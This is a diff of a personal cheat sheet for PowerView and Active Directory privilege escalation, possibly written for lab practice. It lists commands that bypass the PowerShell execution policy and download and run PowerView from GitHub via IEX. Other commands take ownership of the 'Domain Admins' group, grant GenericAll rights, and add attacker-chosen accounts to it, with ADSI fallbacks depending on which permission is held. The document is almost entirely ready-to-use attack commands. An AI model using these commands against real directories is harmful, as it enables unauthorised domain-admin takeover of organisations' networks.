@@ -1,38 +1,38 @@
 #### Power view cheet
 -----------------------------------------------------------------------
 # Commands
-powershell -ep bypass
-Import-Module .\PowerView.ps1
-Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'goodboy'
-Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Domain Admins" -PrincipalIdentity "goodboy"
-net group "domain admins" goodboy /add /domain
+>powershell -ep bypass
+>Import-Module .\PowerView.ps1
+>Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'goodboy'
+>Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Domain Admins" -PrincipalIdentity "goodboy"
+>net group "domain admins" goodboy /add /domain
 
 ------------------------------------------------------------------------------------------------------------
 # Import the AD module (requires RSAT or AD PowerShell tools)
-Import-Module ActiveDirectory
+>Import-Module ActiveDirectory
 
 # Now try the command again
-$acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=bank,DC=com"
+>$acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=bank,DC=com"
 
 --------------------------------------------------------------------------------------------------------
-$groupDN = "LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=com"
-$acl = [System.DirectoryServices.DirectoryEntry]::new($groupDN).ObjectSecurity
+>$groupDN = "LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=com"
+>$acl = [System.DirectoryServices.DirectoryEntry]::new($groupDN).ObjectSecurity
 
 ------------------------------------------------------------------------------------------------------------
 # Create the AD: drive if missing
-New-PSDrive -Name AD -PSProvider ActiveDirectory -Root "" -Server "bank.com"
+>New-PSDrive -Name AD -PSProvider ActiveDirectory -Root "" -Server "bank.com"
 
 # Now get ACL
-$acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=bank,DC=com"
+>$acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=bank,DC=com"
 
 ---------------------------------------------------------------------
 # 1. Take ownership
-$group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"
-$group.psbase.ObjectSecurity.SetOwner([System.Security.Principal.NTAccount]("bank\goodboy"))
-$group.psbase.CommitChanges()
+>$group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"
+>$group.psbase.ObjectSecurity.SetOwner([System.Security.Principal.NTAccount]("bank\goodboy"))
+>$group.psbase.CommitChanges()
 
 # 2. Add self to group
-$group.Add("LDAP://CN=goodboy,CN=Users,DC=bank,DC=local")
+>$group.Add("LDAP://CN=goodboy,CN=Users,DC=bank,DC=local")
 
 
 Key Explanations:
@@ -46,48 +46,48 @@ Write properties
 ---------------------------------------------------------------------------------
 with ✔ Modify permissions
 
-IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
+>IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
 
-Get-Command -Module PowerView
+>Get-Command -Module PowerView
 (If blocked by execution policy, run: Set-ExecutionPolicy Bypass -Scope Process -Force first)
 
 # Verify if 'bb2' has WriteDACL on Domain Admins
-Get-DomainObjectAcl -Identity "Domain Admins" | Where-Object { $_.SecurityIdentifier -eq (Get-DomainUser "bb2").SID } | Select-Object ActiveDirectoryRights
+>Get-DomainObjectAcl -Identity "Domain Admins" | Where-Object { $_.SecurityIdentifier -eq (Get-DomainUser "bb2").SID } | Select-Object ActiveDirectoryRights
 
 # Add GenericAll permission
-Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "bb2" -Rights All -Verbose
+>Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "bb2" -Rights All -Verbose
 
 # Add your account to the group
-Add-DomainGroupMember -Identity "Domain Admins" -Members "bb2" -Verbose
+>Add-DomainGroupMember -Identity "Domain Admins" -Members "bb2" -Verbose
 
 # Verify
-Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberName
+>Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberName
 --------------------------------------------------------------------------------------------------------
 
-with permission  - write all properties ✔ is  only enabled
+## with permission  - write all properties ✔ is  only enabled
 
-if powerview  fails
-$Group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"
-$Group.Add("LDAP://CN=master,CN=Users,DC=bank,DC=local")
+### if powerview  fails
+>$Group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"
+>$Group.Add("LDAP://CN=master,CN=Users,DC=bank,DC=local")
 
 ---------------------------------------------------------------------------
-with permissions - ✔ modify owner is only enabled
+### with permissions - ✔ modify owner is only enabled
 
-IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
-or downloade the script and run by import
+>IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
+. or downloade the script and run by import
 
-powershell -ep bypass
-Import-Module .\powerview.ps1
+>powershell -ep bypass
+>Import-Module .\powerview.ps1
 
-Get-Command Set-DomainObjectOwner, Add-DomainObjectAcl
+>Get-Command Set-DomainObjectOwner, Add-DomainObjectAcl
 
-Set-ExecutionPolicy Bypass -Scope Process -Force
+>Set-ExecutionPolicy Bypass -Scope Process -Force
 
 # 1. Take ownership
-Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "usermad" -Verbose
+>Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "usermad" -Verbose
 
 # 2. Grant yourself GenericAll
-Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "usermad" -Rights All -Verbose
+>Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "usermad" -Rights All -Verbose
 
 # 3. Add to group
-Add-DomainGroupMember -Identity "Domain Admins" -Members "usermad" -Verbose
+>Add-DomainGroupMember -Identity "Domain Admins" -Members "usermad" -Verbose
